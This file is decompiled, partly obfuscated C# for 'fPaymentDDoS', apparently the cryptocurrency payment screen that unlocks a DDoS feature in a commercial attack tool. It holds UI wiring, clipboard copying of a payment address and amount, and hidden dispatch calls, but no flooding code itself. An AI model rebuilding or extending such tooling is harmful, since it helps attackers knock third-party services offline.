﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Zeroit.Framework.Progress;

// Token: 0x02000142 RID: 322
[DesignerGenerated]
public sealed partial class fPaymentDDoS : Form
{
	// Token: 0x060011EF RID: 4591 RVA: 0x0000A09B File Offset: 0x0000829B
	public fPaymentDDoS()
	{
		base.Load += this.fPaymentDDoS_Load;
		base.Closing += this.fPaymentDDoS_Closing;
		this.InitializeComponent();
	}

	// Token: 0x060011F2 RID: 4594 RVA: 0x0000A0CD File Offset: 0x000082CD
	internal PictureBox vmethod_0()
	{
		return this.pictureBox_0;
	}

	// Token: 0x060011F3 RID: 4595 RVA: 0x00083DDC File Offset: 0x00081FDC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(PictureBox pictureBox_7)
	{
		EventHandler value = new EventHandler(this.method_12);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_0 = pictureBox_7;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x060011F4 RID: 4596 RVA: 0x0000A0D5 File Offset: 0x000082D5
	internal Label vmethod_2()
	{
		return this.label_0;
	}

	// Token: 0x060011F5 RID: 4597 RVA: 0x0000A0DD File Offset: 0x000082DD
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(Label label_14)
	{
		this.label_0 = label_14;
	}

	// Token: 0x060011F6 RID: 4598 RVA: 0x0000A0E6 File Offset: 0x000082E6
	internal Label vmethod_4()
	{
		return this.label_1;
	}

	// Token: 0x060011F7 RID: 4599 RVA: 0x0000A0EE File Offset: 0x000082EE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(Label label_14)
	{
		this.label_1 = label_14;
	}

	// Token: 0x060011F8 RID: 4600 RVA: 0x0000A0F7 File Offset: 0x000082F7
	internal Label vmethod_6()
	{
		return this.label_2;
	}

	// Token: 0x060011F9 RID: 4601 RVA: 0x0000A0FF File Offset: 0x000082FF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(Label label_14)
	{
		this.label_2 = label_14;
	}

	// Token: 0x060011FA RID: 4602 RVA: 0x0000A108 File Offset: 0x00008308
	internal ZeroitProgressIndicator vmethod_8()
	{
		return this.zeroitProgressIndicator_0;
	}

	// Token: 0x060011FB RID: 4603 RVA: 0x0000A110 File Offset: 0x00008310
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(ZeroitProgressIndicator zeroitProgressIndicator_1)
	{
		this.zeroitProgressIndicator_0 = zeroitProgressIndicator_1;
	}

	// Token: 0x060011FC RID: 4604 RVA: 0x0000A119 File Offset: 0x00008319
	internal BackgroundWorker vmethod_10()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x060011FD RID: 4605 RVA: 0x00083E20 File Offset: 0x00082020
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(BackgroundWorker backgroundWorker_3)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_14);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_3;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x060011FE RID: 4606 RVA: 0x0000A121 File Offset: 0x00008321
	internal Label vmethod_12()
	{
		return this.label_3;
	}

	// Token: 0x060011FF RID: 4607 RVA: 0x0000A129 File Offset: 0x00008329
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(Label label_14)
	{
		this.label_3 = label_14;
	}

	// Token: 0x06001200 RID: 4608 RVA: 0x0000A132 File Offset: 0x00008332
	internal PictureBox vmethod_14()
	{
		return this.pictureBox_1;
	}

	// Token: 0x06001201 RID: 4609 RVA: 0x00083E64 File Offset: 0x00082064
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(PictureBox pictureBox_7)
	{
		EventHandler value = new EventHandler(this.method_15);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_7;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06001202 RID: 4610 RVA: 0x0000A13A File Offset: 0x0000833A
	internal PictureBox vmethod_16()
	{
		return this.pictureBox_2;
	}

	// Token: 0x06001203 RID: 4611 RVA: 0x0000A142 File Offset: 0x00008342
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(PictureBox pictureBox_7)
	{
		this.pictureBox_2 = pictureBox_7;
	}

	// Token: 0x06001204 RID: 4612 RVA: 0x0000A14B File Offset: 0x0000834B
	internal BackgroundWorker vmethod_18()
	{
		return this.backgroundWorker_1;
	}

	// Token: 0x06001205 RID: 4613 RVA: 0x00083EA8 File Offset: 0x000820A8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(BackgroundWorker backgroundWorker_3)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_13);
		BackgroundWorker backgroundWorker = this.backgroundWorker_1;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_1 = backgroundWorker_3;
		backgroundWorker = this.backgroundWorker_1;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06001206 RID: 4614 RVA: 0x0000A153 File Offset: 0x00008353
	internal Label vmethod_20()
	{
		return this.label_4;
	}

	// Token: 0x06001207 RID: 4615 RVA: 0x0000A15B File Offset: 0x0000835B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(Label label_14)
	{
		this.label_4 = label_14;
	}

	// Token: 0x06001208 RID: 4616 RVA: 0x0000A164 File Offset: 0x00008364
	internal System.Windows.Forms.Timer vmethod_22()
	{
		return this.timer_0;
	}

	// Token: 0x06001209 RID: 4617 RVA: 0x0000A16C File Offset: 0x0000836C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(System.Windows.Forms.Timer timer_1)
	{
		this.timer_0 = timer_1;
	}

	// Token: 0x0600120A RID: 4618 RVA: 0x0000A175 File Offset: 0x00008375
	internal Label vmethod_24()
	{
		return this.label_5;
	}

	// Token: 0x0600120B RID: 4619 RVA: 0x0000A17D File Offset: 0x0000837D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(Label label_14)
	{
		this.label_5 = label_14;
	}

	// Token: 0x0600120C RID: 4620 RVA: 0x0000A186 File Offset: 0x00008386
	internal Label vmethod_26()
	{
		return this.label_6;
	}

	// Token: 0x0600120D RID: 4621 RVA: 0x0000A18E File Offset: 0x0000838E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(Label label_14)
	{
		this.label_6 = label_14;
	}

	// Token: 0x0600120E RID: 4622 RVA: 0x0000A197 File Offset: 0x00008397
	internal PictureBox vmethod_28()
	{
		return this.pictureBox_3;
	}

	// Token: 0x0600120F RID: 4623 RVA: 0x00083EEC File Offset: 0x000820EC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(PictureBox pictureBox_7)
	{
		EventHandler value = new EventHandler(this.method_11);
		PictureBox pictureBox = this.pictureBox_3;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_3 = pictureBox_7;
		pictureBox = this.pictureBox_3;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06001210 RID: 4624 RVA: 0x0000A19F File Offset: 0x0000839F
	internal Label vmethod_30()
	{
		return this.label_7;
	}

	// Token: 0x06001211 RID: 4625 RVA: 0x0000A1A7 File Offset: 0x000083A7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(Label label_14)
	{
		this.label_7 = label_14;
	}

	// Token: 0x06001212 RID: 4626 RVA: 0x0000A1B0 File Offset: 0x000083B0
	internal Label vmethod_32()
	{
		return this.label_8;
	}

	// Token: 0x06001213 RID: 4627 RVA: 0x00083F30 File Offset: 0x00082130
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(Label label_14)
	{
		EventHandler value = new EventHandler(this.method_9);
		Label label = this.label_8;
		if (label != null)
		{
			label.Click -= value;
		}
		this.label_8 = label_14;
		label = this.label_8;
		if (label != null)
		{
			label.Click += value;
		}
	}

	// Token: 0x06001214 RID: 4628 RVA: 0x0000A1B8 File Offset: 0x000083B8
	internal Label vmethod_34()
	{
		return this.label_9;
	}

	// Token: 0x06001215 RID: 4629 RVA: 0x00083F74 File Offset: 0x00082174
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(Label label_14)
	{
		EventHandler value = new EventHandler(this.method_10);
		Label label = this.label_9;
		if (label != null)
		{
			label.Click -= value;
		}
		this.label_9 = label_14;
		label = this.label_9;
		if (label != null)
		{
			label.Click += value;
		}
	}

	// Token: 0x06001216 RID: 4630 RVA: 0x0000A1C0 File Offset: 0x000083C0
	internal Label vmethod_36()
	{
		return this.label_10;
	}

	// Token: 0x06001217 RID: 4631 RVA: 0x0000A1C8 File Offset: 0x000083C8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(Label label_14)
	{
		this.label_10 = label_14;
	}

	// Token: 0x06001218 RID: 4632 RVA: 0x0000A1D1 File Offset: 0x000083D1
	internal Label vmethod_38()
	{
		return this.label_11;
	}

	// Token: 0x06001219 RID: 4633 RVA: 0x0000A1D9 File Offset: 0x000083D9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(Label label_14)
	{
		this.label_11 = label_14;
	}

	// Token: 0x0600121A RID: 4634 RVA: 0x0000A1E2 File Offset: 0x000083E2
	internal Label vmethod_40()
	{
		return this.label_12;
	}

	// Token: 0x0600121B RID: 4635 RVA: 0x0000A1EA File Offset: 0x000083EA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(Label label_14)
	{
		this.label_12 = label_14;
	}

	// Token: 0x0600121C RID: 4636 RVA: 0x0000A1F3 File Offset: 0x000083F3
	internal ToolStripStatusLabel vmethod_42()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x0600121D RID: 4637 RVA: 0x0000A1FB File Offset: 0x000083FB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(ToolStripStatusLabel toolStripStatusLabel_1)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_1;
	}

	// Token: 0x0600121E RID: 4638 RVA: 0x0000A204 File Offset: 0x00008404
	internal BackgroundWorker vmethod_44()
	{
		return this.backgroundWorker_2;
	}

	// Token: 0x0600121F RID: 4639 RVA: 0x00083FB8 File Offset: 0x000821B8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(BackgroundWorker backgroundWorker_3)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_7);
		BackgroundWorker backgroundWorker = this.backgroundWorker_2;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_2 = backgroundWorker_3;
		backgroundWorker = this.backgroundWorker_2;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06001220 RID: 4640 RVA: 0x0000A20C File Offset: 0x0000840C
	internal StatusStrip vmethod_46()
	{
		return this.statusStrip_0;
	}

	// Token: 0x06001221 RID: 4641 RVA: 0x0000A214 File Offset: 0x00008414
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x06001222 RID: 4642 RVA: 0x0000A21D File Offset: 0x0000841D
	internal PictureBox vmethod_48()
	{
		return this.pictureBox_4;
	}

	// Token: 0x06001223 RID: 4643 RVA: 0x0000A225 File Offset: 0x00008425
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(PictureBox pictureBox_7)
	{
		this.pictureBox_4 = pictureBox_7;
	}

	// Token: 0x06001224 RID: 4644 RVA: 0x0000A22E File Offset: 0x0000842E
	internal PictureBox vmethod_50()
	{
		return this.pictureBox_5;
	}

	// Token: 0x06001225 RID: 4645 RVA: 0x0000A236 File Offset: 0x00008436
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(PictureBox pictureBox_7)
	{
		this.pictureBox_5 = pictureBox_7;
	}

	// Token: 0x06001226 RID: 4646 RVA: 0x0000A23F File Offset: 0x0000843F
	internal Label vmethod_52()
	{
		return this.label_13;
	}

	// Token: 0x06001227 RID: 4647 RVA: 0x0000A247 File Offset: 0x00008447
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(Label label_14)
	{
		this.label_13 = label_14;
	}

	// Token: 0x06001228 RID: 4648 RVA: 0x0000A250 File Offset: 0x00008450
	internal PictureBox vmethod_54()
	{
		return this.pictureBox_6;
	}

	// Token: 0x06001229 RID: 4649 RVA: 0x00083FFC File Offset: 0x000821FC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(PictureBox pictureBox_7)
	{
		EventHandler value = new EventHandler(this.method_16);
		PictureBox pictureBox = this.pictureBox_6;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_6 = pictureBox_7;
		pictureBox = this.pictureBox_6;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x0600122A RID: 4650 RVA: 0x00084040 File Offset: 0x00082240
	private void fPaymentDDoS_Load(object sender, EventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9/*?8f8", object_);
	}

	// Token: 0x0600122B RID: 4651 RVA: 0x00084078 File Offset: 0x00082278
	public void method_0(int int_1)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fPaymentDDoS.Delegate109(this.method_0), new object[]
			{
				int_1
			});
			return;
		}
		base.Opacity = Conversion.Val((double)this.int_0 / 100.0);
	}

	// Token: 0x0600122C RID: 4652 RVA: 0x000840D4 File Offset: 0x000822D4
	public void method_1(string string_5)
	{
		object[] object_ = new object[]
		{
			this,
			string_5
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9Q*?:[m", object_);
	}

	// Token: 0x0600122D RID: 4653 RVA: 0x00084108 File Offset: 0x00082308
	private void method_2(ref string string_5, ref string string_6, ref string string_7)
	{
		object[] array = new object[]
		{
			this,
			string_5,
			string_6,
			string_7
		};
		Class4 @class = Class149.smethod_0();
		Stream stream_ = Class149.smethod_1();
		try
		{
			@class.method_139(stream_, ")&O9n*?:.^", array);
		}
		finally
		{
			string_5 = (string)array[1];
			string_6 = (string)array[2];
			string_7 = (string)array[3];
		}
	}

	// Token: 0x0600122E RID: 4654 RVA: 0x000841A0 File Offset: 0x000823A0
	private void method_3()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O8D*?6@H", object_);
	}

	// Token: 0x0600122F RID: 4655 RVA: 0x000841D0 File Offset: 0x000823D0
	private void method_4(string string_5, string string_6)
	{
		object[] object_ = new object[]
		{
			this,
			string_5,
			string_6
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9'*?9YP", object_);
	}

	// Token: 0x06001230 RID: 4656 RVA: 0x00084208 File Offset: 0x00082408
	public bool method_5()
	{
		object[] object_ = new object[]
		{
			this
		};
		return (bool)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O84*?;@+", object_);
	}

	// Token: 0x06001231 RID: 4657 RVA: 0x00084240 File Offset: 0x00082440
	public void method_6()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9i*?83'", object_);
	}

	// Token: 0x06001232 RID: 4658 RVA: 0x00084270 File Offset: 0x00082470
	private void method_7(object sender, DoWorkEventArgs e)
	{
		Thread.Sleep(1000);
		this.int_0 = 0;
		while (this.int_0 < 100)
		{
			ref int ptr = ref this.int_0;
			this.int_0 = checked(ptr + 1);
			this.method_0(this.int_0);
			Thread.Sleep(1);
		}
	}

	// Token: 0x06001233 RID: 4659 RVA: 0x000842BC File Offset: 0x000824BC
	public void method_8()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O8h*?7Kh", object_);
	}

	// Token: 0x06001234 RID: 4660 RVA: 0x0000A258 File Offset: 0x00008458
	private void method_9(object sender, EventArgs e)
	{
		Clipboard.Clear();
		Clipboard.SetText(this.vmethod_32().Text);
		Interaction.MsgBox("Address copied to clipboard!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001235 RID: 4661 RVA: 0x0000A281 File Offset: 0x00008481
	private void method_10(object sender, EventArgs e)
	{
		Clipboard.Clear();
		Clipboard.SetText(this.vmethod_34().Text);
		Interaction.MsgBox("Amount copied to clipboard!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001236 RID: 4662 RVA: 0x0000A258 File Offset: 0x00008458
	private void method_11(object sender, EventArgs e)
	{
		Clipboard.Clear();
		Clipboard.SetText(this.vmethod_32().Text);
		Interaction.MsgBox("Address copied to clipboard!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001237 RID: 4663 RVA: 0x0000A2AA File Offset: 0x000084AA
	private void method_12(object sender, EventArgs e)
	{
		Clipboard.Clear();
		Clipboard.SetText(Conversions.ToString(this.vmethod_2().Tag));
		Interaction.MsgBox("Remaining amount copied to clipboard!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06001238 RID: 4664 RVA: 0x000842EC File Offset: 0x000824EC
	private void method_13(object sender, DoWorkEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O8H*?<`R", object_);
	}

	// Token: 0x06001239 RID: 4665 RVA: 0x00084270 File Offset: 0x00082470
	private void method_14(object sender, DoWorkEventArgs e)
	{
		Thread.Sleep(1000);
		this.int_0 = 0;
		while (this.int_0 < 100)
		{
			ref int ptr = ref this.int_0;
			this.int_0 = checked(ptr + 1);
			this.method_0(this.int_0);
			Thread.Sleep(1);
		}
	}

	// Token: 0x0600123A RID: 4666 RVA: 0x0007DE3C File Offset: 0x0007C03C
	private void method_15(object sender, EventArgs e)
	{
		Interaction.MsgBox(string.Concat(new string[]
		{
			"If you've already paid and still seeing this payment form, please close it and wait some minutes before starting ",
			Application.ProductName,
			" again.\r\n\r\nMost likely, your payment is still waiting for a confirmation and your purchased item will automatically become available once confirmed.\r\n\r\nNOTE: ",
			Application.ProductName,
			" uses private nodes in the blockchain to check for confimrations, not public services like blockchain.com.\r\nThis means a confirmation may sometimes take a little longer or sometimes even faster. Do not panic, but allow some more minutes."
		}), MsgBoxStyle.Question, Application.ProductName);
	}

	// Token: 0x0600123B RID: 4667 RVA: 0x0000A281 File Offset: 0x00008481
	private void method_16(object sender, EventArgs e)
	{
		Clipboard.Clear();
		Clipboard.SetText(this.vmethod_34().Text);
		Interaction.MsgBox("Amount copied to clipboard!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x0600123C RID: 4668 RVA: 0x00084324 File Offset: 0x00082524
	public void method_17()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9=*?98E", object_);
	}

	// Token: 0x0600123D RID: 4669 RVA: 0x00084354 File Offset: 0x00082554
	public void method_18(string string_5, bool bool_1, string string_6, decimal decimal_0)
	{
		object[] object_ = new object[]
		{
			this,
			string_5,
			bool_1,
			string_6,
			decimal_0
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O:6*?<QM", object_);
	}

	// Token: 0x0600123E RID: 4670 RVA: 0x00007348 File Offset: 0x00005548
	private void fPaymentDDoS_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x04000708 RID: 1800
	private PictureBox pictureBox_0;

	// Token: 0x04000709 RID: 1801
	private Label label_0;

	// Token: 0x0400070A RID: 1802
	private Label label_1;

	// Token: 0x0400070B RID: 1803
	private Label label_2;

	// Token: 0x0400070C RID: 1804
	private ZeroitProgressIndicator zeroitProgressIndicator_0;

	// Token: 0x0400070D RID: 1805
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x0400070E RID: 1806
	private Label label_3;

	// Token: 0x0400070F RID: 1807
	private PictureBox pictureBox_1;

	// Token: 0x04000710 RID: 1808
	private PictureBox pictureBox_2;

	// Token: 0x04000711 RID: 1809
	private BackgroundWorker backgroundWorker_1;

	// Token: 0x04000712 RID: 1810
	private Label label_4;

	// Token: 0x04000713 RID: 1811
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x04000714 RID: 1812
	private Label label_5;

	// Token: 0x04000715 RID: 1813
	private Label label_6;

	// Token: 0x04000716 RID: 1814
	private PictureBox pictureBox_3;

	// Token: 0x04000717 RID: 1815
	private Label label_7;

	// Token: 0x04000718 RID: 1816
	private Label label_8;

	// Token: 0x04000719 RID: 1817
	private Label label_9;

	// Token: 0x0400071A RID: 1818
	private Label label_10;

	// Token: 0x0400071B RID: 1819
	private Label label_11;

	// Token: 0x0400071C RID: 1820
	private Label label_12;

	// Token: 0x0400071D RID: 1821
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x0400071E RID: 1822
	private BackgroundWorker backgroundWorker_2;

	// Token: 0x0400071F RID: 1823
	private StatusStrip statusStrip_0;

	// Token: 0x04000720 RID: 1824
	private PictureBox pictureBox_4;

	// Token: 0x04000721 RID: 1825
	private PictureBox pictureBox_5;

	// Token: 0x04000722 RID: 1826
	private Label label_13;

	// Token: 0x04000723 RID: 1827
	private PictureBox pictureBox_6;

	// Token: 0x04000724 RID: 1828
	private Struct18 struct18_0;

	// Token: 0x04000725 RID: 1829
	private Struct18 struct18_1;

	// Token: 0x04000726 RID: 1830
	private Struct16 struct16_0;

	// Token: 0x04000727 RID: 1831
	private string string_0;

	// Token: 0x04000728 RID: 1832
	private string string_1;

	// Token: 0x04000729 RID: 1833
	private string string_2;

	// Token: 0x0400072A RID: 1834
	private string string_3;

	// Token: 0x0400072B RID: 1835
	private string string_4;

	// Token: 0x0400072C RID: 1836
	private bool bool_0;

	// Token: 0x0400072D RID: 1837
	private TimeSpan timeSpan_0;

	// Token: 0x0400072E RID: 1838
	private Stopwatch stopwatch_0;

	// Token: 0x0400072F RID: 1839
	private int int_0;

	// Token: 0x02000143 RID: 323
	// (Invoke) Token: 0x06001246 RID: 4678
	private delegate void Delegate103(ref string string_0, ref string string_1, ref string string_2);

	// Token: 0x02000144 RID: 324
	// (Invoke) Token: 0x0600124A RID: 4682
	private delegate void Delegate104(string string_0);

	// Token: 0x02000145 RID: 325
	// (Invoke) Token: 0x0600124E RID: 4686
	private delegate void Delegate105();

	// Token: 0x02000146 RID: 326
	// (Invoke) Token: 0x06001252 RID: 4690
	private delegate void Delegate106();

	// Token: 0x02000147 RID: 327
	// (Invoke) Token: 0x06001256 RID: 4694
	private delegate void Delegate107(string string_0, bool bool_0, string string_1, decimal decimal_0);

	// Token: 0x02000148 RID: 328
	// (Invoke) Token: 0x0600125A RID: 4698
	private delegate void Delegate108(string string_0, string string_1);

	// Token: 0x02000149 RID: 329
	// (Invoke) Token: 0x0600125E RID: 4702
	private delegate void Delegate109(int int_0);
}
